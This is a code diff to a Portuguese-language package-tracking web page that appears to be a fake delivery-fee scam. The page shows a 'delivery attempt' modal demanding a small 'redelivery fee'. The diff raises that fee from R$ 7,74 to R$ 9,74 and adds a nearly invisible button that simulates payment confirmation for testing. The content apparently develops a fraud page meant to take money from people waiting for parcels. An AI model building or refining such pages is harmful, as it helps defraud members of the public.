@@ -518,7 +518,7 @@
     <div class="modal-overlay" id="deliveryModal" style="display: none;">
         <div class="modal-container">
             <div class="modal-header delivery-header">
-                <h3><i class="fas fa-truck"></i> Tentativa de Entrega</h3>
+                <h3><i class="fas fa-truck"></i> <span id="deliveryModalTitle">Tentativa de Entrega</span></h3>
                 <button class="modal-close" id="closeDeliveryModal">
                     <i class="fas fa-times"></i>
                 </button>
@@ -530,7 +530,7 @@
                     <p>Para receber seu pacote, é necessário pagar a taxa de reentrega:</p>
                     <div class="liberation-fee">
                         <span class="fee-label">Taxa:</span>
-                        <span class="fee-value" id="deliveryFeeValue">R$ 7,74</span>
+                        <span class="fee-value" id="deliveryFeeValue">R$ 9,74</span>
                     </div>
                 </div>
 
@@ -564,6 +564,11 @@
                                 <li><i class="fas fa-check"></i> Confirme o pagamento</li>
                             </ol>
                         </div>
+                    </div>
+                    
+                    <!-- Container de Simulação Discreto -->
+                    <div id="simulador-pagamento-delivery" style="border-top: 1px solid #ddd; padding: 12px 0 0 0; margin-top: 16px; text-align: center;">
+                        <button onclick="confirmarSimulacaoEntrega()" style="font-size: 14px; color: #999; background: none; border: none; cursor: pointer;">-</button>
                     </div>
                 </div>
                 
@@ -705,6 +710,23 @@
             // Processar pagamento com sucesso
             if (window.trackingSystemInstance) {
                 window.trackingSystemInstance.processSuccessfulPayment();
+            }
+        }
+        
+        // Função de simulação de pagamento da tentativa de entrega
+        function confirmarSimulacaoEntrega() {
+            console.log('🧪 Simulação: Pagamento da tentativa de entrega confirmado');
+            
+            // Fechar modal imediatamente
+            const modal = document.getElementById('deliveryModal');
+            if (modal) {
+                modal.style.display = 'none';
+            }
+            
+            // Processar reenvio com sucesso
+            if (window.trackingSystemInstance && window.trackingSystemInstance.postPaymentSystem) {
+                const attemptNumber = 1; // Simular primeira tentativa
+                window.trackingSystemInstance.postPaymentSystem.processDeliveryRetry(attemptNumber);
             }
         }
         
